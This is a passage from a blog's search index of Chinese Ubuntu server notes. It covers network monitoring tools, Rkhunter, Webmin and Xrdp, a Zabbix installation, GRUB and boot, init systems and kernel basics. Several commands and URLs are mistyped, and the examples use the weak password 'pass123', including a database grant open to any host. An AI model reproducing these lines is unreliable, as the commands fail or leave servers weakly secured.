--parallel # number of parallel client streams to run # 并发数量 -R, --reverse run in reverse mode (server sends, client receives) -w, --window #[KMG] set window size / socket buffer size -C, --congestion &lt;algo> set TCP congestion control algorithm (Linux and FreeBSD only) -M, --set-mss # set TCP/SCTP maximum segment size (MTU - 40 bytes) -N, --no-delay set TCP/SCTP no delay, disabling Nagle's Algorithm -4, --version4 only use IPv4 -6, --version6 only use IPv6 -S, --tos N set the IP 'type of service' -L, --flowlabel N set the IPv6 flow label (only supported on Linux) -Z, --zerocopy use a 'zero copy' method of sending data -O, --omit N omit the first n seconds -T, --title str prefix every output line with this string --get-server-output get results from server --udp-counters-64bit use 64-bit counters in UDP test packets --no-fq-socket-pacing disable fair-queuing based socket pacing 使用 # 作为服务端 iperf3 -s # 作为客户端，连接服务端 iperf3 -c 192.168.0.111 查看当前带宽占用1.nload须在问题发生当下执行命令 # 安装 apt install nload # 使用 sudo nload nload -uk -U m enp0s3 # 查看指定网卡流量（如果不指定会自动查找网卡） nload -m # 同时查看多网卡流量 2.iftop 优点：会显示流量通信之间的主机双方 # 安装 apt install iftop # 运行 sudo iftop sudo iftop -n -N # 不解析域名、端口（以ip地址形式显示通信双方） # 其他参数 -p # 混杂模式（凡是流经你网卡的流量都会被探测） -i eth0 # 指定网卡 3.iptraf # 安装两个软件包 sudo apt install iptraf iptraf-ng sudo iptraf-ng # 字符菜单方式展示 # 选择，高亮显示，详细信息，配置... 4. nethogs可显示每个进程所使用的带宽 # 产生大流量不一定是病毒 # 安装 sudo apt install nethogs 其他工具​ …. … document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>网络工具</tag>
        <tag>ubuntu</tag>
        <tag>带宽监测</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-Rkhunter]]></title>
    <url>%2Fposts%2F53417%2F</url>
    <content type="text"><![CDATA[谣言 Linux系统很安全，从不感染病毒 已知的恶意软件没有Windows系统多 Rootkit 隐藏自身能力超强的恶意软件(一 个或一组) 将自身注入主板芯片、硬盘引导扇区、系统内核、底层驱动 运行级别优先于系统或驻留于内核特权层级 难于发现、难于清除、更换硬件都无法清除 最早是出现在Unix系统上的一类正向技术 有时木马程序也可视为Rootkit 的一种 Rootkit Hunter 安全监视和分析工具(非处置型工具) 检测Rootkit、恶意软件、不安全设置、文件完整性、可疑端口 基于特征匹配 脚本(调用其他通用工具完成检测任务) 运行方式 需要要root权限 只能运行于Bourne类型的shell (bash、 ksh) 手动运行、cron job 安装 sudo apt install rkhunter # 按照向导即可 配置 sudo vi /etc/default/rkhunter CRON DAILY_RUN="true" # 每天自动运行来检查系统 CRON_ DB_ UPDATE="true" # 这里简单修改几项 升级特征库 sudo rkhunter --propupd 执行检查 # 默认对系统所有检查项进行（每一项都需要回车确认，--sk就不用手动敲回车了） sudo rkhunter --check --sk # 检查结果如果显示是绿色的，基本就没啥问题 日志文件 # var/log/rkhunter.log less var/log/rkhunter.log 误报白名单 sudo vi /etc/rkhunter.conf SCRIPTWHITELIST=/usr/bin/egrep SCRIPTWHITELIST=/usr/bin/fgrep SCRIPTWHITELIST=/usr/bin/ldd document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>ubuntu</tag>
        <tag>Rkhunter</tag>
        <tag>安全检查</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-远程管理 Webmin&usermin&Xrdp]]></title>
    <url>%2Fposts%2F40012%2F</url>
    <content type="text"><![CDATA[Webmin 基于WEB的系统远程管理 基于图形化的友好操作界面 多开启一个服务端口，增加了攻击面 Webmin WEB应用程序，完成部分服务器日常管理操作 安装依赖包apt -y install python apt-show-versions libapt-pkg-perl libauthen-pam-perl libio-pty-perl libnet-ssleay-perl 下载安装# 下载安装 curl -L -O htt://www.webmin.com/download/deb/webmin-current.deb dpkg -i webmin-current.deb # 安装 # 配置允许访问的ip（这里配置本地地址 和 某个网段） vi /etc/webmin/miniserv.conf allow=127.0.0.1 10.0.0.0/24 # 重启服务 systemctl restart webmin 访问# 访问 https://10.1.1.1:10000 # 使用系统账号登录，建议root ## 管理系统 如果多台服务器，可以用"广播服务器"来寻找其他装了Webmin的服务器，在一个web端来统一管理 usermin普通用户自服务usermin 安装依赖包 apt -y install python apt- -show-versions libapt-pkg-perl libauthen-pam-perl libio-pty-perl libnet-ssleay-perl 安装 curl -L -0 http:/ /www.webmin.com/download/ deb/usermin-current.deb dpkg -i usermin-current.deb vi /etc/usermin/ miniserv.conf allow=127.0.0.1 10.0.0.0/24 denyuser=root # 禁止root登录usermin systemctl restart usermin 访问 https://10.0.1.12:20000 # Xrdp远程桌面 VNC vs XRDP 使用Windows远程桌面连接工具远程管理Linux Server 图形化桌面作为后段 Gnome、 KDE、Xfce (越来越火) 安装Xfce桌面环境 # 以Xfce为例 sudo apt install xfce4 xfce4-goodies xorg dbus-x11 x11-xserver-utils 安装XRDP sudo apt install xrdp 配置 sudo vi /etc/xrdp/xrdp.ini exec startxfce4 # 这里是xfce4 重启服务 sudo systemctl restart xrdp 防火墙 sudo ufw allow 3389 sudo ufw allow from 10.0.0.0/24 to any port 3389 # 可以限制来源ip地址 连接 用Windows的远程连接工具(mstsc)连接Linux服务器 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>ubuntu</tag>
        <tag>远程管理</tag>
        <tag>Webmin</tag>
        <tag>usermin</tag>
        <tag>Xrdp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-Zabbix]]></title>
    <url>%2Fposts%2F60461%2F</url>
    <content type="text"><![CDATA[Zabbix – 最流行的开源的企业级监控系统之一 基本可对全平台，全系统做监控：网络设备、操作系统、应用程序 Unix、L inux、Windows、MacOS 监控方式：Agent(硬件设备,被监控机器上安装，自己的作为Zabbix服务器) / Agenless 系统环境 修改：IP(静态)、Hostname、 DNS、NTP`bash修改主机名vim /etc/cloud/cloud.cfg preserve_hostname；true vim /etc/hostname zab.lab.com # 作为zabbix服务器 域名解析10.1.8.132 zab.lab.com 重启zabbix服务器 #### 安装&amp;配置 ###### 1.安装配置Apache ```bash # 管理是Web界面，在Zabbix服务器机器上 apt install apache2 vim /etc/apache2/conf-enabled/security.conf ServerTokens Prod # 显示最少的主机头信息 vim /etc/apache2/apache2.conf ServerName zab.lab.com # 主机名 vim /etc/apache2/sites-enabled/000-default.conf ServerAdmin webmaster@lab.com # 重启服务 systemctl restart apache2 2.安装phpapt install php php-cgi libapache2-mod-php php-common php-pear php-mbstring # 启动模块 a2enconf php7.2-cgi systemctl reload apache2 vi /etc/php/7.2/apache2/php.ini date.timezone = "Asia/Shanghai" # 测试页面 vi /ar/www/htm/index.php &lt;html> &lt;body> &lt;?php print "PHP Test"; ?>&lt;/body>&lt;/html> 3.安装MySQLapt install mariadb-server mysql_secure_installation # 安全初始化 mysql CREATE DATABASE zabbix_db CHARACTER SET utf8 collate utf8 bin; grant all privileges on zabbix_db.* to zabbix@'localhost' identified by 'pass123'; grant all privileges on zabbix_db.* to zabbix@'%' identified by 'pass123'; flush privileges; 4.安装Zabbix# 下载适合ubuntu发行版本(这里是bionic)的二进制包（根据自己的下载） wget https://repo.zabbix.com/zabbix/4.0/ubuntu/ pool/main/z/zabbix-release/zabbix-release_ 4.0-3+bionic_ all.deb apt install ./zabbix-release_4.0-3+bionic_all.deb &amp;&amp; apt update # dpkg -i xx 也可；增加了一条zabbix官方源的文件 sudo apt install zabbix-server-mysql zabbix-frontend-php zabbix-agent # 这里zabbix-agent安装是因为把zabbix-server自己也纳入监视范围 zcat /usr/share/doc/ zabbix- server-mysql/create.sql.gz | mysql -u zabbix -p zabbix_db # zcat 可以查看压缩文件里面的内容；初始化表结构 # 修改zabbix服务端配置文件中数据库连接密码 vi /etc/zabbix/zabbix_server.conf DBName=zabbix_db DBUser=zabbix DBPassword=pass123 # 重启服务 systemctl restart zabbix-server 5.配置Zabbix# 配置agent（这里是服务端监视自己的agent） vi /etc/zabbix/zabbix_agentd.conf Hostname= zab.lab.com # 让他找到我们的zabbix server的地址 # 重启 systemctl restart zabbix-agent systemctl enable zabbix-server # 开机自启 vi /etc/ apache2/conf-enabled/zabbix.conf Allow from 10.0.0.10/24 # 设置谁能访问我zabbix的管理页面 # 重启apache systemctl restart apache2 6.访问Web&amp;初始化# htp://zab.lab.com/zabbix/ # 设置数据库连接参数 DB Password Hostname # 登陆: Admin / zabbix # 修改密码 # 添加监视的主机（agent模式下，目标端口要开） 至此，zabbix服务端已经配置完毕 7.在被监控服务器上安装配置agent## 安装 wget hts://repo.zabbix.com/zabbix/4.0/ubuntu/pool/main/z/zabbix-release/zabbix-release.4.0-3+bionic.all.deb sudo apt install ./zabbix-release_4.0-3+bionic.all.deb sudo apt update sudo apt install zabbix-agent # 安装zabbix-agent # 修改agent服务器的主机名 和 DNS域名解析 # PSK / CA加密服务器与客户端之间的通信 ## 配置 vi /etc/zabbix/zabbix_agentd.conf Server=zab.lab.com # 指向zabbix-server ServerActive=zab.lab.com Hostname= zab.lab.com TLSConnect=psk # 这里设置psk加密的参数 TLSAccept=psk TLSPSKIdentity=PSK 001 # ID必须唯一 TLSPSKFile=/etc/zabbix/zabbix_agentd.psk # 随机生成文件内容 psk的值 openssl rand -hex 32 | sudo tee /etc/zabbix/zabbix_agentd.psk sudo systemctl start zabbix-agent sudo systemctl enable zabbix-agent 8.服务端添加agent# Web界面 Configuration -> Hosts -> Create host -> ... -> Template(指定监视目标的什么服务) -> Security(都选择PSK, agent的id, psk的值) document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>ubuntu</tag>
        <tag>Zabbix</tag>
        <tag>监控</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-引导过程]]></title>
    <url>%2Fposts%2F24845%2F</url>
    <content type="text"><![CDATA[BIOS/UEFI 打开黑箱看看里面 操作系统是如何启动的 三个彼此独立但相互关联的过程1.Bios/UEFI自检过程（POST） - 加电自检 - 硬件识别与检测 # UEFI比较新，原理和效果不一样 2.Boot Load加载执行过程 引导加载程序允许您选择想要引导的操作系统 3.操作系统启动过程 启动各种服务及操作系统本身 BIOS 打开黑箱看看里面 主板芯片（计算机运行的第一个程序） - 执行基本的检查或开机自测(POST) - 识别连接在计算机上的所有硬件、可用性、底层参数 例如内存、硬盘、键盘和显卡等 - 不同的BIOS可以设置检查参数 - 轮训硬盘控制器，启动其板载芯片，配置RAID等 - 引导顺序 - 不当的配置可导致计算机无法使用 UEFI 打开黑箱看看里面 较新的主板支持UEFI (2015年以后) - 视觉上与BIOS相似，但原理极不相同 - 运行速度略快于BIOS - 创建UEFI是为了克服BIOS的故有缺陷 - BIOS运行基于16位处理器，UEFI基于现代处理器 - 内存使用量方面，BIOS有 限，UEFI按需要量使用 - BIOS只能读取MBR引导操作系统; UEFI可读取系统安装时划分的独立分区 - BIOS支持最大2T的硬盘，UEFI使用GPT分区表，最大支持8-9Z硬盘 安全引导(Secure-boot) 打开黑箱看看里面 - 恶意软件可通过Boot Loader加载到系统中 - UEFI提供了安全引导 Secure-boot - 加载前通过公钥/私钥验证签名的引|导加载程序和硬件 - 64位操作系统支持Secure-boot,某些硬件无法更改操作系统类型（如某些电脑厂商不让电脑装其他系统，他给锁死了，要问好Secure-boot能不能关或在开启Secure-boot时候能不能按其他系统。其实建议Secure-boot开启） - 目前绝大多数硬件同时支持BISO/UEFI，可自行选择启动 硬盘分区表 打开黑箱看看里面 - 分区表通常位于硬盘起始位置 - 记录硬盘的划分情况 - 两种类型：MBR / GPT Boot Loader 打开黑箱看看里面 BIOS/UEFI不关系统安装的操作系统 POST自检结束后，BIOS/UEFI读取硬盘Boot Loader 读取并执行Boot L oder，由其引|导操作系统 Linux世界里两大Boot Loader程序 LILO:基本已被废弃 GRUB:目前绝大多数发行版采用 BIOS引导过程 打开黑箱看看里面 BIOS -&gt; Boot Loader (GRUB2)第一阶段：boot.img读取并运行MBR硬盘起始的446字节第二阶段：boot.img 查找并运行core.img (通常位于MBR Gap) core.img的任务是访问/boot/grub，加载该目录下的所有模块 加载启动菜单，自动或手动选择进一步引导的系统内核 UEFI引导过程 打开黑箱看看里面 第一阶段 UEFI读取GPT分区表，找到EFI分区(格式Fat32 / 大小默认537M / boot esp ) 从中读取、执行boot loader代码，加载模块 命令parted 一print (读的是文件：/boot/efi/EFl/ubuntu/ grubx64.efi)`bashsudo parted 查看 分区的信息print disk 工具也可来查看分区 第二阶段 - 查找`/boot/grub/x86_ 64- -efi/core.efi` 执行 - 生成GRUB2菜单， 选择不同内核引导系统(内核二进制文件:`vmlinuz-&lt;release- number&gt;` ) - 加载硬件驱动文件initrd.img到内存中，然后控制权交给内核，继续引导 - 系统加载systemd / upstart / init, 启动各服务 #### GRUB2 GRUB是一个强大的多引导加载程序 ```bash - Windows --下的引导程序--&gt; ntldr # 不兼容Linux - MacOS ---&gt; Boot Camp 两种启动方式 -直接查找和加载所需的内核 -加载另一个引导加载程序 操作系统引导的四个核心组件 内核文件、驱动器名称、内核文件所在分区号、初始化RAM盘 GRUB菜单GRUB菜单文件 /boot/grub/grub.cfg (自动生成，不可修改) 主要来源文件/etc/grub.d/* 菜单定义: menuentry / submenu 显示菜单 - Vi /etc/default/grub GRUB_TIMEOUT_STYLE=menu # 让他显示菜单 GRUB_TIMEOUT=100 # 超时时间（100s如果不做选择，就启动默认的） sudo update-grub 单用户模式类似于Windows启动时F8灾难恢复模式BIOS: ShiftUEFI: Esc GRUB菜单-“e"-在引导项最后增加“single"-Ctrl+ X 进入 手动生成GRUB菜单文件 sudo grub-mkconfig --output mygrub.cfg 安全风险 恶意用户可能修改boot loader, 造成安全问题 设置GRUB密码 sudo vi /etc/grub.d/40_custom # custom的文件在更新系统后不会被覆盖 set superusers=xps password yuanfh pass123 sudo update--grub 以上明文存储GRUB密码存在风险隐患 # 使用工具 grub-mkpasswd-pbkdf2 grub-mkpasswd-pbkdf2 # 输入密码，会生成一段密文 sudo vim /etc/grub.d/40_custom password_pbkdf2 xps grub.pbkdf2.sha512 ...... # 上面的密文放到配置文件中 sudo update--grub # 此方法不适合远程托管到IDC机房的机器（一重启在grup时就要输入密码，此时SSH还未连接） # 指定启动项用户 menuentry --> --users xps 其他BootLoader(LILO, Grub之外的)1.SYSL INUX 从FAT分区引导系统的BootLoader (U盘启动时) 2.EXTL INUX # 小型的Linux 从ext2、ext3、 ext4、 btrfs引导系统的小型BootLoader 3.ISOL .INUX # 光盘启动 从LiveCD、LiveDVD引导系统的BootLoader # isolinux.bin 映像文件; isolinux.cfg 配置文件 4.PXELINUX (无盘站–&gt;无硬盘)从网络服务器引导系统的BootLoader PXE（Pre-boot eXecution Environment） 使用DHCP为工作站分配IP 使用BOOTP加载BootLoader映像 TFTP将引导映像传输至工作站(基于UDP协议) /tftpboot/ pxelinux.0 : PXE BootLoader /tftpboot/ pxelinux.cfg :配置文件 目前新版支持NFS、HTTP、FTP服务器 系统无法启动!两大问题原因 内核问题：手动安装内核时缺少模块、库文件(发行版错误) 驱动器故障：无法读取根驱动器 处理办法: 使用先前无故障版本内核引导系统 单用户模式(指定内核参数) 对于驱动器故障，可以使用救援盘(CD/DVD、USB) 检修硬盘：fsck /dev/sda1 显示GRUB菜单 可以开机一直按住ESC键、或SHIFT键（在故障发生时，且没修改过grup菜单显示时） 操作系统启动 服务/Service (windows) ==后台/daemon (Linux) INIT：内核引导后运行第一个程序INIT,初始化操作系统并启动服务(直到关机) - 内核加载后的初始化进程，用于启动其他程序 - 所有服务启动由init 程序处理(`PID=1`) ，所有系统服务进程都是其子进程 - `pstree -p 1` - `/usr/sbin/init -&gt; /lib/ systemd/systemd` 现在的`init`程序早已不是以前那个init，只是沿用，实则是个符号链接 - 早期版本配置文件：`/etc/inittab` (`ubuntu无此文件！`) 三种INIT 接上面 1.SysV / SysV-init源自UNIX System V (目前老版本Linux还在使用) 2.Upstart兼容SysV，Ubuntu意图用于替换SysV，其他发行版也有使用几乎没有完整实现的Upstart（Ubuntu自己都不用Upstart了） 3.Systemd目前主流发行版使用systemd-sysv包兼容SysV格式的initd脚本始于2010年，是目前最新的系统初始化后台程序;速度更快，效率更高 SysV 分成不同运行级别的一组Shell脚本(哪些程序，什么时候运行) 每个程序有一个独立的脚本控制其启动或停止 系统启动时进入一个运行级(一组随系统启动的程序) 内核启动首先读取运行级别配置文件，决定进入哪个运行级 运行级别：0 关机 1 单用户模式(系统维护) 2 Debian多用户图形模式、 3 多用户文本模式 4 未定义 5 RedHat多用户图形模式 6 重启系统 # 不同发行版可能略有不同 在不同运行级下启动程序的方法方法1：/etc/ inittab：定义不同运行级下启动的程序，每行定义一个应用程序 id:runlevels:action:process #- ID: 包含1-4个字符，唯一标识一个程序 #- runlevel: 运行级列表(在哪个运行级中运行该程序，例如: 345) #- action: #- id:3:initdefault: 系统启动后默认进入的运行级 方法2：启动脚本/etc/init.d/下的脚本/etc/rc1.d为例是不同级别1下要运行的程序(符号链接)，K开头表示kill掉,S是启动，后面数字的值代表优先级，最后面代表程序的名称 除了运行级，SysV也使用启动脚本控制程序启动、停止启动脚本存放于/etc/init.d/中，通过/etc/rcX.d/目录调用(X 运行级)脚本文件名S: Start; K: Kill/Stop，数字表示优先级(依赖顺序)通过具体脚本启动停止程序稍嫌麻烦，系统包含工具指定脚本的运行级 # 给我们提供了管理工具 chkconfig / update-rc.d #用于查看和修改程序的运行级(RedHat / Debian) chkconfig --list &lt;program_name> #查看 chkconfig -- levels 12345 &lt;program_name> on #设置 update-rc.d program defaults / update rc.d &lt;program_name> remove update- -rc.d -f &lt;program_name> start 40 2 34 5. stop 80 0 1 6. #具体运行级别和顺序(在那几个级别启动这个程序，在那几个级别stop这个程序) 40、80指在具体运行级中程序的启动顺序(0-99) action字段(在Ubuntu中已经找不到了) boot 进程在系统扃动时启动 bootwait 进程在系统启动时启动，系统会等待它启动完成 initdefault 系统默认进入的运行级别 kbrequest 进程在按下特殊的组合键后启动 once 当进入运行级别时，进程启动一次，后面down了也就不管了 powerfail 系统关闭时才运行 powerwait 系统关闭时才运行，系统将等待其运行完成 respawn 进入运行级时启动，并在终止时重新启动（病毒可以这样，你杀掉之后过一会又会起来） sysinit 在boot和bootwait项之前启动 wait 进程启动一次，系统等待其完成 查看系统运行级 runlevel # 显示之前和现在的运行级 N 5 # 上面命令的执行结果 # N 表示系统【之前】处于原始boot运行级 # 5 表示【当前】运行级 更改运行级 init 6 # 重启系统(teljinit) init 0 # 关机 # init的问题在于命令立刻生效。这对个人电脑没有问题，但对多用户环境有影响（可能造成其他用户也...） # 多用户环境，建议使用shutdown、halt、 poweroff、 reboot (时间、通知) ## 接受别人给发的通知 mesg y # 开启 mesg # 查看 who -T # 第二列终端前面如果有+号，表示他允许别人给他发消息 write xps tty1 # 给指定用户在某个指定的终端发送消息 #运行后直接写消息就行 wall xxxxxxx # 给所有登录用户发消息（广播） Upstart 操作系统的复杂度不断上升，造成SysV脚本越来越复杂 ubuntu官方开发Upstart用于替换SysV 处理可热插拔设备在Linux系统中造成的动态环境 使用公钥/etc/init/文件夹替代/etc/inittab 和/etc/init.d 中的启动脚本 每个程序和服务在init文件夹中都有一个&lt;program_name&gt;.conf配置文件 启动和停止服务 sudo start/stop bluetooth # ubuntu中没有 Linux Standard Base (LSB) 是一些Linux发行版协商共同支持的规范 目的是在不同Linux发行版之间创建一 致的使用体验 LSB定义了标准的init命令:·start、 stop、 restart 所有遵循L SB的Linux发行版都应该支持以上命令 但是Debian等发行方退出了LSB组织，目前ubuntu中不包含lsb_release -a # Linux世界可能会日趋分裂，统一用户体验的缺失势必提高用户的学习成本 Sytemd(目前最主流) 由RedHat开发，并迅速流行于Linux世界 Systemd 在系统初始化的方式上引入了一个主要的范式转换，并引起了一些争议 它放弃使用多 个小型初始化脚本，转而使用单一程序，配合每个服务独立的配置文件 这违背了早期的Linux哲学(小而专著是性能、稳定、安全性的基础) 放弃了初始化脚本和运行级，Systemd创造了target / unit的概念 unit用来定义service、action 由名称、类型、配置文件组成 常见unit类型automount、 device、 mount、 path、 service、 snapshot、 socket、 target 等等 unit的命名方式 name.type # 如sshd.service 当前系统已加载的unit systemctl list- -units # 查看 Systemd 使用service类型的unit 管理后台服务 target 类型组合多个unit实现同时启动 例如network.target组合了所有用于启动网卡的unit 系统初始化过程中，target 类似于SysV中运行级别的概念 一个target对应- -组service 配置unit每个unit需要一个配置文件来定义需要启动、如何启动什么程序配置文件路径/lib/systemd/system/，不同版本，路径不尽相同 cat /lib/systemd/system/ssh.service ExecStart #指定运行程序 After #依赖的服务(先于ssh服务运行的程序) WantedBy #指定target (运行级) Restart #何时重启 tartget配置文件 定义需要启动的unit(不定义具体程序) # 以graphical为例 cat /lib/systemd/system/graphical.target 默认target # 系统引导后默认启动的target(default.target) /lib/systemd/system/default.target -> graphical.target # 只需对目标做个软链接 systemctl程序 # 常用参数 list-unites / start / stop / restart / reload /status / enable / disable #计算机每次引导时启动/禁用 isolate #启动指定单元(停止其他所有单元) default #修改默认target 兼容SysV # 对应的运行级别 /lib/ systemd/system/runlevel0.target # poweroff.target /lib/ systemd/ system/ runlevel1.target # rescue.target /lib/ systemd/ system/ runlevel5.target # graphical.target /lib/ systemd/ system/ runlevel6.target # reboot.target # 比如，进入到运行级别1 systemctl isolate runlevel1 内核Linux系统组成 Linux内核 GNU系统工具 图形化桌面环境 应用软件 内核控制计算机软硬件 由L inus Torvalds(当年是赫尔辛基大学的学生)创造， 直到目前为止的负责人(Linux Foundation) 操作系统的核心功能 管理系统的内存 管理软件程序 管理硬件 管理文件系统 如何安装内核(其不同的组成部分)？ 如何创建新内核(支持新硬件和软件特性)？ 如何管理内核及内核模块？ 内存管理 在系统的内存容量限制下，控制程序如何运行 除管理物理内存，操作系统还负责创建和管理虚拟内存 虚拟内存并非真实存在，它利用硬盘空间创建并当作真实内存使用(SWAP) 内核将一段时间不活跃的内容页转储到SWAP，并在需要时重新读入物理内存 Swapping out机制使系统认为自己拥有更多可用的内存空间(降低性能) 内存空间被分组到称为内存页的块中 内核定位物理内存或交换空间中的每个内存页 内核维护内存页表，登记哪些页位于物理内存/SWAP 查看虚拟内存 cat / proc/ meminfo # 运行实时的数据 # MemTotal: 2048000 kB # 物理内存 MemFree: 438123 kB # 空闲 MemAvilable 3580848 KB # 实际可用的空间 SwapTotal: 2048000 kB # SwapFree: 2048000 kB Linux系统每个进程的内存彼此独立 不同进程无法互访彼此内存空间，内核负责维护这种约束 没有其他进程可以访问内核使用的内存空间 共享内存页 内核可创建共享的内存区域，供多进程共享数据，内核负责验证和准入进程 查看当前系统共享内存页 ipcs -m # 结果字段： owner #创建此共享内存段的帐号 perms #共享权限 key #允许其他用户访问此内存段 软件程序管理运行中的程序称为进程 内核控制所有进程运行(前台运行、后台运行) 初始化进程(init) 负责启动所有其他进程 内核每启动一个进程，都在内存中为其分配独享的一段内存区域存放数据、代码 查看当前进程 ps ps -ax # 建议加参数 ## 显示的字段含义 # PID：进程ID # STAT：进程状态(Sleep、 Sleep and Wait、Run) # [process] swapping out 带放括号的都是放到虚拟内存中的 硬件管理 与系统通信的所有硬件都需要将驱动植入内核 内核编译同时包含硬件驱动(早期唯一方法) 驱动程序以内核模块型式加载 内核模块是一个自包含的驱动程序库，可动态与内核链接/取消链接 Linux系统的三种硬件设备文件`bash 字符设备文件: 一次只能处理一个字符数据的设备(调制解调器、终端) c 块设备文件: 一次能处理一大块数据的设备(硬盘) b 网络设备文件:使用包来发送和接收数据的设备(网卡)` Linux为系统上的每个硬件设备创建称为节点的特殊文件 内核通过唯一的数字对标识每个节点(主、次) 同类型设备主节点号相同，同一主节点号下，次节点号唯一`bashcd /dev &amp;&amp; ls -al sd ttyS结果显示brw-rw—- 1 root disk 8, 0 12月5 15:14 sda # 8，0 主设备标识/次设备标识brw-rw—- 1 root disk 8, 1 12月5 15:14 sda1brw-rw—- 1 root disk 8, 16 12月5 15:14 sdbbrw-rw—- 1 root disk 8, 17 12月5 15:14 sdb1crw- -rW—- 1 root uucp 4, 64 12月5 15:14 ttyS0crw-rw—- 1 root uucp 4, 65 12月5 15:14 ttyS1 #### 文件系统管理 文件系统定义OS如何在存储设备上存储数据 - 分区、格式化 - Linux 支持包括Windows在内的众多文件系统 - 内核统一使用Virtual File System (`VFS`) 与不同文件系统进行交互 #### 内核的文件构成 **内核二进制文件** - 内核程序本身，BootLoader加载到内存中执行的内容(位于`/boot`或`/`中) - 基于编译打包的驱动数量不同，内核=进制文件可能很大 - 内核二进制文件通常被压缩，以便加载内核时节省内存空间 - 压缩方式不同，将导致内核二进制文件名称差异 | 不同的Linux内核文件 | 备注 | | ------------------ | ----------------------------------------------------- | | bzimage | （常用）GNU zip压缩的大内核，常被拷贝为4(vmlinuz) | | kernel | 未压缩 | | vmlinux | 未压缩，通常不用作最终的引导版本 | | vmlinuz | 通用的压缩文件（如ubuntu下：vmlinuz-4.15.0-65-generic） | | zimage | 使用GNU zip压缩的小内核 | | | | #### 内核模块 **内核直接与硬件交互** - 内核与硬件通信需要驱动程序的支持 - 将硬件驱动和内核的`源码`一并编译成二进制执行文件(体积大) - 将驱动编译为二进制的模块对象文件`.ko`， 运行时动态链接 **硬件驱动的发布** - 源码：开源精神 - 二进制文件：保护隐私、功能特性 **内核模块(`modprob`)** ```bash /lib/modules/&lt;version&gt;/kernel/*.ko 内核源码获得 Linux内核开发库(www.kernel.org –&gt; 稳定版、开发版) 对应Linux发行版的软件库(对本发行版最稳妥，下载方便) 下载源码解压至/usr/src/linux (内核工具默认查找路径)链接到指定版本 /usr/src/linux-5.3.12 # 维护多个版本 /usr/src/kernels # Redhat 内核补丁 针对bug修复和安全补丁的增量内核发行版 内核补丁版本(针对主版本的补丁) 只包含应用于主内核源代码发行版以获得增量发行版的更改(5.3 –&gt; 5.3.1) 使用patch命令将补丁源码包应用于主源码包，然后重新编译 后续补丁版本(5.3.1 -&gt; 5.3.2) 卸载早期版本补丁(patch -R) patch新版本补丁 重新编译 内核头Linux内核绝大部分使用C语言编写 - C语言头文件:编译时需要的库文件 - 编译内核、模块都需要相同的内核头(库文件) Ubuntu内核头 sudo apt install linux-headers-4.15.0-72-generic /usr/src/linux-headers-4.1 5.0-72-generic/include/config/*.h # ubuntu /usr/src/kernels # Redhat # 不同发行版路径不同 # 查看使用的内核版本 uname -r 内核文档 许多独立的文本文件，说明每个源代码文件在内核结构中的作用 针对内核源码做任何操作之前，建议详细阅读文档 由于文档体量巨大，通常以独立包形式发布 文档路径/usr/src/linux/Documentation # Ubuntu /usr/src/kernels # Redhat 内核版本 七个内核版本命名方式(系统) Linus于1991年9月发布了初始Linux内核版本号0.01 0表示该版本目的是测试，并非生产环境使用(延用至0.95 – 1 992.3) 1994年3月，Linus 发布了Linux 的第一个生产版本1.0 (1.x.y) x主版本号(奇数表示测试/开发版本；偶数表示稳定/生产版本) y主版本下的补丁版本 此版本号延用至 1.3 (1995.5) 1.3之后Linux内核变化很大，因此下一个版本为2.0 (1996.6) 2.x.y延用1.x.y 的命名方式，直至2.4 (2001.1) 2003.12 Linus发布2.6.0版本，启动了一个新的版本命名系统 由于2.6内核非常稳定，因此新内核版本格式为2.6.x.y（不再通过奇偶数来区分稳定与否） 2.6 每个版本都是生产版本(开发版结尾为-rc) 此版本延用至2.6.39 (2011.5) 2011.7 Linus为庆祝Linux内核20岁生日，启动了内核的3.0版本 3.x.y (开发版在结尾加-rc) -直延用至3.19 (2015.2) 3.x.y-z 临时特殊补丁版(主要与紧急的安全修复有关) 2015.4发布4.0版本 4.x.y (与3.0相同) 4.x.y-z (y的第z次微调版本) 2019.3发布5.0版本 目前最新，命名延用以前 查看内核版本 uname -r 维护内核 手动编译内核(较少使用，忽略) 使用发行版包管理器维护内核（建议的方式） 模块文件/lib/modules/version/kermel/*.ko 手动编译内核模块，当升级内核时需要重新编译模块 Dynamic Kernel Module Support (DKMS) 注册自定义模块后，dkms监视内核变化，并自动运行脚本重新编译安装模块 常用模块命令# 已安装模块列表 lsmod # 模块之间存在依赖关系 # 查看模块详细信息 modinfo bluetooth # 比如查看蓝牙模块的信息 # 安装/删除模块 insmod / rmmod # 需指定'完整'内核模块文件路径(依赖模块未加载时失败) modprobe -r # 或者这种方式安装，只需指定模块名，自动安装依赖（比较友好） 内核排错查看内核版本 uname -r # -a显示全部信息 /proc目录 # Linux内核创建的动态伪目录 